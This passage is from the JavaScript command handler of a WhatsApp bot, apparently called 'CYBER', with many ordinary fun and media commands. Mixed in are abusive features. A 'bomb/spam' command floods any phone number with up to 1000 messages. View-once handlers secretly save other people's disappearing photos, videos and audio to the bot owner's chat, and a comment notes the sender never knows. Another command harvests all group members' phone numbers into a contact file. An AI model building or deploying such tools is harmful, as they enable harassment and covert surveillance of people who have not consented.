        return reply(`👥 *CYBER Online*\n\nThis command only works in groups.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🟢', key: m.key } });
        
        // Get group metadata first
        const groupMetadata = await devtrust.groupMetadata(m.chat);
        const totalMembers = groupMetadata.participants.length;
        
        let online = [];
        let botJid = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        
        // Method 1: Check presences store
        if (store && store.presences && store.presences[m.chat]) {
            const presences = store.presences[m.chat];
            
            for (let [jid, presence] of Object.entries(presences)) {
                // Check if user is online/available
                if (presence.lastKnownPresence === 'available' || 
                    presence.lastPresence === 'online' ||
                    presence.presences?.lastPresence === 'online') {
                    if (!online.includes(jid)) {
                        online.push(jid);
                    }
                }
            }
        }
        
        // Method 2: Get from group metadata (as fallback)
        if (online.length === 0) {
            // Show first 10 as "recently active" since we can't really know
            online = groupMetadata.participants.slice(0, 10).map(p => p.id);
        }
        
        // Add bot to list if not already there
        if (!online.includes(botJid)) {
            online.unshift(botJid); // Add bot at top
        }
        
        // Remove duplicates
        online = [...new Set(online)];
        
        if (online.length === 0) {
            return reply(`👤 *CYBER Online*\n\nNo members currently online in ${groupMetadata.subject}.`);
        }
        
        // Format message with group info
        let text = `🟢 *CYBER Online*\n\n`;
        text += `Group: ${groupMetadata.subject}\n`;
        text += `Total: ${totalMembers} members\n`;
        text += `Online: ${online.length} currently\n\n`;
        
        online.forEach((user, index) => {
            let emoji = user === botJid ? '🤖' : '👤';
            text += `${emoji} ${index + 1}. @${user.split('@')[0]}\n`;
        });
        
        text += `\n_Updated: ${new Date().toLocaleTimeString()}_`;
        
        await devtrust.sendMessage(m.chat, {
            text: text,
            mentions: online
        }, { quoted: m });
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Listonline error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Online*\n\nOnline checker is taking a nap. Try again later.`);
    }
}
break;

case 'gpt':
case 'gpt3':
case 'gpt4':
case 'gpt5':
case 'open-%+%ai':
case 'vxnxji': {
    if (!text) return reply(`🤖 *Example:* ${command} how are you?`);
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
        const sysPromptGPT = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari or Urdu Nastaliq script.`;
        const resGPT = await axios.post('https://text.pollinations.ai/', {
            messages: [
                { role: 'system', content: sysPromptGPT },
                { role: 'user', content: text }
            ],
            model: 'openai',
            seed: -1
        }, { timeout: 40000 });
        const answerGPT = typeof resGPT.data === 'string' ? resGPT.data : JSON.stringify(resGPT.data);
        if (!answerGPT || answerGPT.startsWith('<')) return reply("⚠️ *GPT did not respond* — try again");
        const chunksGPT = answerGPT.match(/[\s\S]{1,3000}/g) || [answerGPT];
        for (let i = 0; i < chunksGPT.length; i++) {
            await devtrust.sendMessage(m.chat, { text: (i === 0 ? "🤖 *GPT-4*\n\n" : "") + chunksGPT[i] }, i === 0 ? { quoted: m } : {});
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('GPT error:', e.message);
        reply("❌ *GPT error* • Try later");
    }
}
break;

case 'quote': {
    try {
        const res = await fetch('https://zenquotes.io/api/random');
        const json = await res.json();
        const quote = json[0].q;
        const author = json[0].a;
        
        const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: quoteImg },
                caption: `_"${quote}"_\n— *${author}*`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Quote failed*');
    }
}
break;

case 'joke': {
    try {
        let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single'); 
        let data = await res.json();
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: `😂 *Joke*\n\n${data.joke}`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Joke failed*');
    }
}
break;

case 'truth': {
    try {
        let res = await fetch('https://api.truthordarebot.xyz/v1/truth');
        let data = await res.json();
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: `😳 *Truth*\n\n❖ ${data.question}`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Truth failed*');
    }
}
break;

case 'dare': {
    try {
        let res = await fetch('https://api.truthordarebot.xyz/v1/dare');
        let data = await res.json();
        
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: 'https://files.catbox.moe/smv12k.jpeg' },
                caption: `😈 *Dare*\n\n❖ ${data.question}`
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Dare failed*');
    }
}
break;

case 'jid': {
    reply(from);
}
break;

case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': 
case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': 
case 'smooth': case 'squirrel': {
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        
        if (set) {
            if (/audio/.test(mime)) {
                // Processing message (simple like your style)
                reply(`⚡ *ᴘʀᴏᴄᴇssɪɴɢ ${command.toUpperCase()} ᴇғғᴇᴄᴛ...*`);
                
                // FIXED: changed 'bad' to 'devtrust'
                let media = await devtrust.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ғғᴍᴘᴇɢ ᴇʀʀᴏʀ: ${err}`);
                        return reply(`❌ *ғᴀɪʟᴇᴅ ᴛᴏ ᴀᴘᴘʟʏ ${command.toUpperCase()} ᴇғғᴇᴄᴛ*`);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    // FIXED: changed 'bad' to 'devtrust'
                    devtrust.sendMessage(m.chat, 
                        addNewsletterContext({
                            audio: buff,
                            mimetype: 'audio/mpeg'
                        }), 
                        { quoted: m }
                    );
                    fs.unlinkSync(ran);
                });
            } else {
                reply(`🎵 *Reply to audio with ${prefix + command}*`);
            }
        } else {
            reply(`❌ *Invalid effect*\nᴜsᴇ: .bass, .blown, .deep, .earrape, .fast, .fat, .nightcore, .reverse, .robot, .slow, .smooth, .squirrel`);
        }
    } catch (e) {
        reply(`❌ *Error:* ${e.message}`);
    }
    break;
}

case 'say':
case 'tts':
case 'gtts': {
    if (!text) return reply("🗣️ *What should I say?*");

    const ttsUrl = googleTTS.getAudioUrl(text, {
        lang: "en",
        slow: false,
        host: "https://translate.google.com",
    });

    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            audio: { url: ttsUrl },
            mimetype: "audio/mp4",
            ptt: true,
            fileName: `${text}.mp3`,
            caption: `🔊 *Saying:* ${text}`
        }),
        { quoted: m }
    );
}
break;

case "rwaifu": {
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: imageUrl },
            caption: "✨ *Random Waifu*"
        }),
        { quoted: m }
    );
}
break;

case 'waifu': {
    try {
        const waifudd = await axios.get(`https://nekos.best/api/v2/waifu?amount=1`);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: waifudd.data.results[0].url },
                caption: "✨ *Waifu*"
            }),
            { quoted: m }
        );
    } catch (err) {
        reply('❌ *Error fetching waifu image*');
    }
}
break;

case 'vv':
case 'vvgh':
case 'vv2':
case 'readviewonce2': {
    const _vvSilent  = (command === 'vv2' || command === 'readviewonce2');
    const _vvBotNum  = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
    const { downloadContentFromMessage: _dlcVV } = require('@whiskeysockets/baileys');

    // ── Build entry from cache → quoted → last-vo ──
    let _vvEntry = null;
    const _vvQuotedId = m.quoted?.id || m.msg?.contextInfo?.stanzaId || null;
    if (_vvQuotedId && global._viewOnceBufferMap?.has(_vvQuotedId)) {
        _vvEntry = global._viewOnceBufferMap.get(_vvQuotedId);
    }
    if (!_vvEntry && m.quoted) {
        const _qMsg = m.quoted?.message || m.quoted || {};
        const _qType = _qMsg.imageMessage ? 'imageMessage'
            : _qMsg.videoMessage ? 'videoMessage'
            : _qMsg.audioMessage ? 'audioMessage'
            : (m.quoted.mtype || '');
        const _qInner = _qMsg[_qType] || m.quoted.msg || m.quoted;
        if (_qType && _qInner) {
            _vvEntry = {
                msg: { [_qType]: _qInner },
                type: _qType,
                mime: _qInner?.mimetype
                    || (_qType === 'imageMessage' ? 'image/jpeg'
                        : _qType === 'videoMessage' ? 'video/mp4'
                        : _qType === 'audioMessage' ? 'audio/ogg; codecs=opus' : ''),
                caption: _qInner?.caption || '',
                isPtt: Boolean(_qInner?.ptt),
                sender: (m.quoted.sender || m.sender || '').split(':')[0].replace('@s.whatsapp.net', ''),
                chat: m.chat,
                buffer: null,
                ts: Date.now()
            };
        }
    }
    if (!_vvEntry) {
        const _cand = global._lastViewOnce?.[m.chat];
        if (_cand && (Date.now() - _cand.ts) < 30 * 60 * 1000) _vvEntry = _cand;
    }
    if (!_vvEntry) {
        if (!_vvSilent) reply('❌ Reply to a view-once media (or send within 30 min).');
        break;
    }

    // ── Ensure buffer ──
    if (!_vvEntry.buffer && _vvEntry.type) {
        try {
            const _mType = _vvEntry.type.replace('Message', '');
            const _src   = _vvEntry.msg?.[_vvEntry.type];
            if (_src) {
                const _s = await _dlcVV(_src, _mType);
                const _c = []; for await (const _ch of _s) _c.push(_ch);
                const _b = Buffer.concat(_c);
                if (_b.length > 0) _vvEntry.buffer = _b;
            }
        } catch (_vvDlE) { console.error('vv dl error:', _vvDlE?.message); }
    }
    if ((!_vvEntry.buffer || _vvEntry.buffer.length === 0) && m.quoted) {
        try {
            const _b = await m.quoted.download();
            if (Buffer.isBuffer(_b) && _b.length > 0) _vvEntry.buffer = _b;
        } catch(_) {}
    }
    if (!_vvEntry.buffer || _vvEntry.buffer.length === 0) {
        break;
    }

    const _vvTime = new Date().toLocaleString('en-US', {
        timeZone: process.env.TIMEZONE || 'Africa/Harare', hour12: true,
        hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric'
    });
    const _vvSenderShort = _vvEntry.sender || (m.sender || '').split('@')[0];
    const _vvCapBase = `From: @${_vvSenderShort}\nChat: ${m.chat.includes('g.us') ? 'Group' : 'Private'}\nTime: ${_vvTime}` +
        (_vvEntry.caption ? `\n📝 ${_vvEntry.caption}` : '');

    try {
        if (_vvEntry.type === 'imageMessage') {
            await devtrust.sendMessage(_vvBotNum, { image: _vvEntry.buffer, caption: `📸 *View-Once Image*\n${_vvCapBase}`, mimetype: _vvEntry.mime || 'image/jpeg', mentions: [m.sender] });
        } else if (_vvEntry.type === 'videoMessage') {
            await devtrust.sendMessage(_vvBotNum, { video: _vvEntry.buffer, caption: `🎥 *View-Once Video*\n${_vvCapBase}`, mimetype: _vvEntry.mime || 'video/mp4', mentions: [m.sender] });
        } else if (_vvEntry.type === 'audioMessage') {
            await devtrust.sendMessage(_vvBotNum, { audio: _vvEntry.buffer, mimetype: _vvEntry.mime || 'audio/ogg; codecs=opus', ptt: _vvEntry.isPtt });
        }
    } catch (_vvSendE) {
        console.error('vv send error:', _vvSendE?.message);
    }
}
break;

case '😭':
case '🌚':
case '🤭':
case '🔥':
case '😋':
case '😊':
case '😘':
case '😎':
case '😅':
case '✨':
case '⭐':
case '🫡':
case '🥺':
case '😁':
case '😐':
case '🙃':
case '🤣':
case '😂':
case '😕':
case '💓':
case '❤️':
case '✅':
case '😝':
case '🫪':
case '🤔':
case '💀':
case '☠️':
case '⚡':
case '💫':
case '🤍':
case '🩵':
case '💙':
case '💝':
case '💖':
case '💗':
case '💞':
case '💕':
case '❤':
case '🫶':
case '👍':
case '🙌':
case '😍':
case '🤩':
case '💯':
case '🎉':
case '🔮':
case '💎':
case '🌟':
case '💥':
case '🎯':
case '🏆':
case '👑':
case '🦋': {
    // Destination: ALWAYS bot's own DM (Message Yourself) — sender ko pata nahi chalta
    const _voDest = botNumber;

    // ── DEDUP: pair.js already handled this fromMe reply? Skip to avoid duplicate send ──
    if (m.key?.id && global._viewOnceHandledIds?.has(m.key.id)) {
        break;
    }

    const { downloadContentFromMessage: _dlcVO } = require('@whiskeysockets/baileys');

    // ── Time / chat helpers ──
    const _voTime = new Date().toLocaleString('en-US', {
        timeZone: process.env.TIMEZONE || 'Africa/Harare', hour12: true,
        hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric'
    });
    const _voChatLabel = m.chat.includes('g.us') ? 'Group' : 'Private';

    // ── Build "entry" from one of three sources, in priority order ──
    let _voEntry = null;

    // 1️⃣ Eager-cache hit by quoted msgId
    const _voQuotedId = m.quoted?.id || m.msg?.contextInfo?.stanzaId || null;
    if (_voQuotedId && global._viewOnceBufferMap?.has(_voQuotedId)) {
        _voEntry = global._viewOnceBufferMap.get(_voQuotedId);
    }

    // 2️⃣ Standalone emoji → last view-once in this chat (≤30 min)
    if (!_voEntry) {
        const _cand = global._lastViewOnce?.[m.chat];
        if (_cand && (Date.now() - _cand.ts) < 30 * 60 * 1000) _voEntry = _cand;
    }

    // 3️⃣ Fallback: build entry from m.quoted (smsg unwraps view-once)
    if (!_voEntry && m.quoted) {
        const _qMsg = m.quoted?.message || m.quoted || {};
        let _qType =
            _qMsg.imageMessage ? 'imageMessage'
            : _qMsg.videoMessage ? 'videoMessage'
            : _qMsg.audioMessage ? 'audioMessage'
            : (m.quoted.mtype || '');
        let _qInner = _qMsg[_qType] || m.quoted.msg || m.quoted;
        if (_qType && _qInner) {
            _voEntry = {
                msg: { [_qType]: _qInner },
                type: _qType,
                mime: _qInner?.mimetype
                    || (_qType === 'imageMessage' ? 'image/jpeg'
                        : _qType === 'videoMessage' ? 'video/mp4'
                        : _qType === 'audioMessage' ? 'audio/ogg; codecs=opus' : ''),
                caption: _qInner?.caption || '',
                isPtt: Boolean(_qInner?.ptt),
                sender: (m.quoted.sender || m.sender || '').split(':')[0].replace('@s.whatsapp.net', ''),
                chat: m.chat,
                buffer: null,
                ts: Date.now()
            };
        }
    }

    if (!_voEntry) break;

    // ── Ensure buffer ──
    if (!_voEntry.buffer && _voEntry.type) {
        try {
            const _mType  = _voEntry.type.replace('Message', '');
            const _voSrc  = _voEntry.msg?.[_voEntry.type] || null;
            if (_voSrc) {
                const _stream = await _dlcVO(_voSrc, _mType);
                const _chunks = [];
                for await (const _ch of _stream) _chunks.push(_ch);
                const _buf = Buffer.concat(_chunks);
                if (_buf.length > 0) _voEntry.buffer = _buf;
            }
        } catch (_voDlErr) {
            console.error('[emoji vv] download error:', _voDlErr?.message);
        }
    }

    // ── Last resort: use Baileys quoted.download() ──
    if ((!_voEntry.buffer || _voEntry.buffer.length === 0) && m.quoted) {
        try {
            const _b = await m.quoted.download();
            if (Buffer.isBuffer(_b) && _b.length > 0) _voEntry.buffer = _b;
        } catch (_qdErr) { /* silent */ }
    }

    if (!_voEntry.buffer || _voEntry.buffer.length === 0) {
        console.log('[emoji vv] no buffer — view-once likely already revoked');
        break;
    }

    // ── Build caption + payload ──
    const _voSender = _voEntry.sender || (m.quoted?.sender || m.sender || '').split('@')[0];
    const _voCap = `🔐 *View-Once Saved!*\n👤 From: @${_voSender}\n💬 Chat: ${_voChatLabel}\n🕒 ${_voTime}` +
        (_voEntry.caption ? `\n\n📝 ${_voEntry.caption}` : '');

    let _voPayload = null;
    if (_voEntry.type === 'imageMessage') {
        _voPayload = { image: _voEntry.buffer, caption: _voCap, mimetype: _voEntry.mime || 'image/jpeg' };
    } else if (_voEntry.type === 'videoMessage') {
        _voPayload = { video: _voEntry.buffer, caption: _voCap, mimetype: _voEntry.mime || 'video/mp4' };
    } else if (_voEntry.type === 'audioMessage') {
        _voPayload = { audio: _voEntry.buffer, mimetype: _voEntry.mime || 'audio/ogg; codecs=opus', ptt: _voEntry.isPtt };
    }

    if (_voPayload) {
        try {
            await devtrust.sendMessage(_voDest, _voPayload);
        } catch (_voSendErr) {
            console.error('[emoji vv] send error:', _voSendErr?.message);
        }
    }
}
break;

case 'save':
case 'download':
case 'svt': {
    if (!isCreator) {
        return reply(`🔒 *CYBER Save*\n\nOwner only command.`);
    }
    
    if (!m.quoted) {
        return reply(`💾 *CYBER Save*\n\nReply to any media to save it.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '💾', key: m.key } });
        
        let media = await m.quoted.download();
        let mime = (m.quoted.msg || m.quoted).mimetype || '';
        let botNumber = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
        
        if (/image/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                image: media,
                caption: `📸 From: ${m.sender.split('@')[0]}`
            });
            reply(`✅ *CYBER Save*\n\nImage saved to bot's DM.`);
            
        } else if (/video/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                video: media,
                caption: `🎥 From: ${m.sender.split('@')[0]}`
            });
            reply(`✅ *CYBER Save*\n\nVideo saved to bot's DM.`);
            
        } else if (/audio/.test(mime)) {
            await devtrust.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg'
            });
            reply(`✅ *CYBER Save*\n\nAudio saved to bot's DM.`);
            
        } else {
            reply(`❌ *CYBER Save*\n\nUnsupported media type.`);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Save error:', err);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Save*\n\nFailed to save media.`);
    }
}
break;

case 'qc': {
    if (!text) return reply('💬 *Example:* qc Your quote here');

    const name = m.pushName || 'User';
    const quote = text.trim();

    let profilePic;
    try {
        profilePic = await devtrust.profilePictureUrl(m.sender, 'image');
    } catch {
        profilePic = 'https://telegra.ph/file/6880771c1f1b5954d7203.jpg';
    }

    const url = `https://www.laurine.site/api/generator/qc?text=${encodeURIComponent(quote)}&name=${encodeURIComponent(name)}&photo=${encodeURIComponent(profilePic)}`;

    try {
        await sendImageAsSticker(m.chat, url, m, {
            packname: "CYBER",
            author: "Quote"
        });
    } catch (err) {
        reply('❌ *Quote sticker failed*');
    }
}
break;

case 'shorturl': {
    if (!text) return reply('🔗 *Provide a URL*');
    
    try {
        let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
        if (!shortUrl1) return reply(`❌ *Failed to shorten URL*`);
        
        reply(`🔗 *Shortened*\n${shortUrl1}`);
    } catch (e) {
        reply('❌ *Error*');
    }
}
break;

case 'unblock': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : 
                m.quoted ? m.quoted.sender : 
                text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    await devtrust.updateBlockStatus(users, 'unblock');
    reply(`✅ *User unblocked*`);
}
break;

case 'block': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : 
                m.quoted ? m.quoted.sender : 
                text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    await devtrust.updateBlockStatus(users, 'block');
    reply(`🚫 *User blocked*`);
}
break;

case 'creategc':
case 'creategroup': {
    if (!isCreator) return reply("🔒 *Owner only*");

    const groupName = args.join(" ");
    if (!groupName) return reply(`📝 *Usage:* ${prefix + command} Group Name`);

    try {
        const cret = await devtrust.groupCreate(groupName, []);
        const code = await devtrust.groupInviteCode(cret.id);
        const link = `https://chat.whatsapp.com/${code}`;

        const teks = `✅ *Group Created*\n\n` +
            `💳 Name: ${cret.subject}\n` +
            `👤 Owner: @${cret.owner.split("@")[0]}\n` +
            `🔗 ${link}`;

        devtrust.sendMessage(m.chat, {
            text: teks,
            mentions: [cret.owner]
        }, { quoted: m });

    } catch (e) {
        reply("❌ *Failed to create group*");
    }
}
break;

case 'tgstickers': {
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎭', key: m.key } });
        const categories = ['hug','pat','kiss','cuddle','wave','smile','dance'];
        const randomCat = categories[Math.floor(Math.random() * categories.length)];
        const { data } = await axios.get('https://nekos.best/api/v2/' + randomCat + '?amount=1');
        await sendImageAsSticker(m.chat, data.results[0].url, m, {
            packname: 'CYBER Stickers',
            author: 'GAME CHANGER'
        });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply('❌ *Sticker fetch failed. Try again.*');
    }
}
break;

case "savecontact": 
case "vcf": 
case "scontact": 
case "savecontacts": {
    if (!m.isGroup) {
        return reply("👥 *Groups only*");
    }

    try {
        let metadata = await devtrust.groupMetadata(m.chat);
        let participants = metadata.participants;
        let vcard = "";
        let noPort = 1;

        for (let a of participants) {
            let num = a.id.split("@")[0];
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${num}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD\n`;
        }

        let filePath = "./contacts.vcf";
        fs.writeFileSync(filePath, vcard.trim());

        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                document: fs.readFileSync(filePath),
                mimetype: "text/vcard",
                fileName: `${metadata.subject}.vcf`,
                caption: `📇 *${participants.length} contacts saved*`
            }), 
            { quoted: m }
        );

        fs.unlinkSync(filePath);
    } catch (err) {
        reply("⚠️ Error: " + err.toString());
    }
}
break;

case 'toimg': {
    const quoted = m.quoted ? m.quoted : null;
    const mime = (quoted?.msg || quoted)?.mimetype || '';
    
    if (!quoted) return reply('🖼️ *Reply to a sticker*');
    if (!/webp/.test(mime)) return reply('`❌ *Reply to a sticker with ' + prefix + 'toimg*`');
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });
        const media = await devtrust.downloadMediaMessage(quoted);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: media,
                mimetype: 'image/webp'
            }),
            { quoted: m }
        );
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply('`❌ *Failed to convert sticker to image*`');
    }
}
break;

case 'tosticker':
case 'sticker':
case 's': {
    if (!m.quoted) {
        return reply(`🎨 *CYBER Sticker Maker*\n\nReply to an image or video with:\n${prefix}${command}\n\nVideo limit: Max 10 seconds`);
    }
    
    const mime = (m.quoted.msg || m.quoted).mimetype || '';
    const mediaType = (m.quoted.msg || m.quoted).seconds || 0;
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
        
        // Image to sticker
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await sendImageAsSticker(m.chat, media, m, { 
                packname: global.packname || "CYBER", 
                author: global.author || "GAME CHANGER" 
            });
        }
        
        // Video to sticker
        else if (/video/.test(mime)) {
            // Check video duration
            if (mediaType > 10) {
                return reply(`❌ *CYBER Sticker Maker*\n\nVideo too long: ${mediaType}s\nMax duration: 10 seconds`);
            }
            
            let media = await m.quoted.download();
            await sendVideoAsSticker(m.chat, media, m, { 
                packname: global.packname || "CYBER", 
                author: global.author || "GAME CHANGER" 
            });
        }
        
        else {
            return reply(`❌ *CYBER Sticker Maker*\n\nInvalid media. Reply to an image or video.\n\nSupported:\n• Images (jpg, png, webp)\n• Videos (mp4, webm, gif) max 10s`);
        }
        
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (error) {
        console.error('Sticker error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Sticker Maker*\n\nSticker machine is jammed. Try again later.`);
    }
}
break;

case 'play':
case 'ytmp3': {
    if (!text) return reply(`🎵 *CYBER Play*\n\nUsage: ${prefix}play [song name or YouTube URL]\nExample: ${prefix}play faded`);
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });
        reply(`🔍 Searching: *${text}*...`);

        const yts = require('yt-search');
        let videoUrl = text;
        let videoInfo = null;

        if (!text.includes('youtube.com') && !text.includes('youtu.be')) {
            const { videos } = await yts(text);
            if (!videos?.length) {
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return reply(`❌ *"${text}"* nahi mila. Koi aur naam try karo.`);
            }
            videoInfo = videos.filter(v => !v.live)[0] || videos[0];
            videoUrl = videoInfo.url;
        }

        // ── Use PrinceTech ytmusic API ────────────────────────────────────────
        const apiRes = await axios.get(
            `https://api.princetechn.com/api/download/ytmusic?apikey=prince&quality=mp3&bitrate=192&url=${encodeURIComponent(videoUrl)}`,
            { timeout: 60000 }
        );
        const apiData = apiRes.data?.result;
        if (!apiData?.download_url) throw new Error('API did not return download URL');

        const titleStr  = apiData.title || videoInfo?.title || 'Unknown';
        const thumb     = apiData.thumbnail || videoInfo?.thumbnail || null;
        const quality   = apiData.quality || '192kbps';
        const safeTitle = titleStr.replace(/[<>:"/\\|?*]+/g, '').substring(0, 50);
        const caption   = `🎵 *${titleStr}*\n🎚️ Quality: ${quality}`;

        if (thumb) await devtrust.sendMessage(m.chat, { image: { url: thumb }, caption }, { quoted: m });

        const audioBuf = await axios.get(apiData.download_url, {
            responseType: 'arraybuffer',
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
            timeout: 180000,
            maxContentLength: 200 * 1024 * 1024
        }).then(r => Buffer.from(r.data));

        await devtrust.sendMessage(m.chat, {
            audio: audioBuf,
            mimetype: 'audio/mpeg',
            fileName: `${safeTitle}.mp3`
        }, { quoted: m });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Play Error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Play failed:* ${error.message}`);
    }
}
break;

case 'bomb':
case 'spam': {
    {
        const _bgNf = (m.sender||'').split('@')[0].split(':')[0];
        try {
            const _bgBf = (global._flagCache?.bugBanned || []);
            if (_bgBf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
            const _bgUf = (global._flagCache?.bugUnlocked || []);
                if (!_bgUf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);

        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
    }
    const q = m.message?.conversation ||
              m.message?.extendedTextMessage?.text || '';
    const [target, text, countRaw] = q.split(',').map(x => x?.trim());

    const count = parseInt(countRaw) || 5;

    if (!target || !text || !count) {
        return reply('📌 *Usage:* spam number,message,count');
    }

    const _spamTargetNum = target.replace(/[^0-9]/g, '');
    const _spamProtected = owner.map(v => v.replace(/[^0-9]/g, ''));
    if (_spamProtected.includes(_spamTargetNum)) return reply('🔒 *Protected Number — Bug nahi lagaya ja sakta owner par*');

    const jid = `${_spamTargetNum}@s.whatsapp.net`;

    if (count > 1000) {
        return reply('❌ *Max 1000 messages*');
    }

    reply(`💣 *Spamming ${target} with ${count} messages*`);

    for (let i = 0; i < count; i++) {
        await devtrust.sendMessage(jid, { text });
        await delay(700);
    }

    reply(`✅ *Spam complete*`);
    break;
}

case 'play2': {
    if (!text) return reply(`🎵 *CYBER Play2*\n\nUsage: ${prefix}play2 [song name or YouTube URL]\nExample: ${prefix}play2 faded`);
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        reply(`🔍 Searching: ${text}...`);

        const yts = require('yt-search');
        let videoUrl = text;
        let videoInfo = null;

        if (text.includes('youtube.com') || text.includes('youtu.be')) {
            videoUrl = text;
        } else {
            const { videos } = await yts(text);
            if (!videos?.length) {
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return reply(`❌ *"${text}"* nahi mila. Koi aur naam try karo.`);
            }
            videoInfo = videos.filter(v => !v.live)[0] || videos[0];
            videoUrl = videoInfo.url;
        }

        const result = await ytDownload(videoUrl);
        if (result.error || result.code !== 200) throw new Error(result.message || 'Download failed');

        const d = result.data;
        if (!d.best_audio && !d.audio_formats?.length) throw new Error('No audio format found');

        const audioFmt = d.best_audio || d.audio_formats[0];
        const titleStr = d.title || videoInfo?.title || 'Unknown';
